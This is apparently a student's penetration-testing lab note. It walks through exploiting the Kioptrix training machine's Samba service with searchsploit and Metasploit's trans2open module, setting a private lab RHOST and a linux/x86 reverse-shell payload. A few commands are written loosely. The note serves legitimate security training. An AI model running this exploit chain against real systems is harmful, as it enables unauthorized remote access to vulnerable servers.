[[Staged vs Non-Staged Payloads]]
### So after we scan our {target} we can see what port running on it and we can identify the vulnerabilities based on the port, then we will use searchsploit to identify the vulnerability through services version.
[[Scanning with Nmap]], [[Enumerating SMB]]

```
┌──(kali㉿kali)-[~]
└─$ searchsploit samba 2.     
---------------------------------------------------------------------- ---------------------------------
 Exploit Title
```

[[Enumerating SSH]] [[Enumerating HTTP and HTTPS Part 1]]
![[Pasted image 20240213214811.png]]

### Now we will use the #METASPLOIT 

**To run the metasploit here's the command.**
```
┌──(kali㉿kali)-[~]
└─$ msfconsole
```

![[Pasted image 20240213215322.png]]

Then we will run this for further searching.

```
msf6 > search trans2open
```
**After running a lot of scanning and enumeration we can see and verify the operating and kernel version of the target system.** 
![[Pasted image 20240213215440.png]]
**Choose the right option for the target system**
![[Pasted image 20240213220510.png]]
Set the RHOST to our target
```
msf6 > set RHOST 192.168.189.130
```
**We can start attacking**
![[Pasted image 20240213220743.png]]

**We got an error while bruteforcing the system due to wrong payload**
```
msf6 > options
```
So we'll run options first.
![[Pasted image 20240213221149.png]]

so we set the payload to linux/86 and hit **Double TAB** to show all of the linux/86 payload

```
msf6 exploit(linux/samba/trans2open) > linux/86/shell_reverse_tcp
```

![[Pasted image 20240213235740.png]]

After we set the payload into linux86/shell_reverse_tcp 
```
msf6 exploit(linux/samba/trans2open) > options
```

![[Pasted image 20240213235917.png]]

**BOOM! WE SUCCESSFULLY EXPLOIT THE KIOPTRIX**
![[Pasted image 20240214000436.png]]